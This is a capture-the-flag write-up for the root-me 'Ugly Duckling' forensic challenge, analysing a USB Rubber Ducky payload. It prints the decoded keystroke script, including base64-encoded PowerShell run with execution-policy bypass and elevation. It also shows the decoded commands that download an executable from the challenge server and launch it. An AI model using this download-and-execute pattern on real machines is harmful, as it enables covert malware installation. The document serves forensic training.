# Ugly duckling

[root-me challenge](https://www.root-me.org/en/Challenges/Forensic/Ugly-Duckling): The CEO’s computer seems to have been compromised internally. A young trainee dissatisfied with not having been paid during his internship arouse our supsicion. A strange USB stick containing a binary file was found on the trainee’s desk. The CEO relies on you to analyze this file.

----

Rubber duck. Decode `file.bin` using the [decoder of ducktoolkit](https://ducktoolkit.com/decode):

![Ducktools](/_static/images/duck.png)

```text
DELAY
iexplore http://challenge01.root-me.org/forensic/ch14/files/796f75277665206265656e2054524f4c4c4544.jpgENTER
DELAY
...
DELAY
%USERPROFILE%\Documents\796f75277665206265656e2054524f4c4c4544.jpgDELAY
ENTER
...
DELAY
powershell Start-Process powershell -Verb runAsDELAY
PowerShell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGMAaABhAGwAbABlAG4AZwBlADAAMQAuAHIAbwBvAHQALQBtAGUALgBvAHIAZwAvAGYAbwByAGUAbgBzAGkAYwAvAGMAaAAxADQALwBmAGkAbABlAHMALwA2ADYANgBjADYAMQA2ADcANgA3ADYANQA2ADQAMwBmAC4AZQB4AGUAJwAsACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AApowershell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAcwBoAGUAbABsAC4AYQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBzAGgAZQBsAGwAZQB4AGUAYwB1AHQAZQAoACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AAoAexit
```

b64 decode:

```text
iex (New-Object System.Net.WebClient).DownloadFile('http://challenge01.root-me.org/forensic/ch14/files/666c61676765643f.exe','666c61676765643f.exe');
iex (New-Object -com shell.application).shellexecute('666c61676765643f.exe');
```

Download that `666c61676765643f.exe` and use `strings` to grep the flag.

